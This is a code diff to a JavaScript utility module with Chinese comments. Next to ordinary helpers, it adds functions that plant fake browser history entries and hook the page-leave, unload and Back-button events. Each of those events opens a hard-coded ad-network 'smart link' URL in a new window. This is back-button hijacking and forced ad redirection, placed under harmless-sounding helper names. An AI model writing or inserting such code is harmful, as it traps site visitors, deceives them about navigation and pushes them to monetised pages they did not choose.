@@ -4,6 +4,8 @@
  * @param {number} wait 等待时间（毫秒）
  * @returns {Function} 返回一个新的防抖函数
  */
+import {gaLogEvent} from "./event";
+
 export function debounce(func, wait) {
   if (typeof func !== 'function') {
     throw new TypeError('Expected a function');
@@ -150,5 +152,54 @@ export async function loadScript (url, type) {
       console.error(`[loadScript] ❌ 异常: ${url}`, err);
       reject(err);
     }
+  });
+}
+
+const appendParams = (url, extraParams = {}) => {
+  let u = new URL(url, window.location.origin);
+  Object.entries(extraParams).forEach(([key, val]) => {
+    u.searchParams.set(key, String(val));
+  });
+  return u.href;
+}
+
+// 添加浏览器历史记录
+export const pushRouterHistory = () => {
+  let baseUrl = location.href;
+  let routerStatus = "one"
+  let ts = Date.now();
+  let url1 = appendParams(baseUrl, { p: 'two', ts: ts });
+  let url2 = appendParams(baseUrl, { p: routerStatus, ts: ts + 1 });
+
+  // 初始化
+  history.replaceState({ page: 'two' }, '', url1);
+  history.pushState({ page: routerStatus }, '', url2);
+}
+
+export const jumpUrl = (url, type='_blank') => {
+  if (!url) return false;
+  gaLogEvent.logEvent({
+    eventName: "back_smart_link",
+    eventValue: url,
+    eventLog: `Enter Smart Link`
+  })
+  window.open(url, type);
+}
+
+// 回退跳转
+export const bachJump = () => {
+  window.addEventListener("pagehide", () => {
+    const item = "https://www.profitablecpmratenetwork.com/fq3key41?key=fc5b02ea1eb8e2a60efbe3e0a4204089";
+    jumpUrl(item)
+  });
+
+  window.addEventListener("beforeunload", () => {
+    const item = "https://www.profitablecpmratenetwork.com/fq3key41?key=fc5b02ea1eb8e2a60efbe3e0a4204089";
+    jumpUrl(item)
+  });
+
+  window.addEventListener("popstate", () => {
+    const item = "https://www.profitablecpmratenetwork.com/fq3key41?key=fc5b02ea1eb8e2a60efbe3e0a4204089";
+    jumpUrl(item)
   });
 }
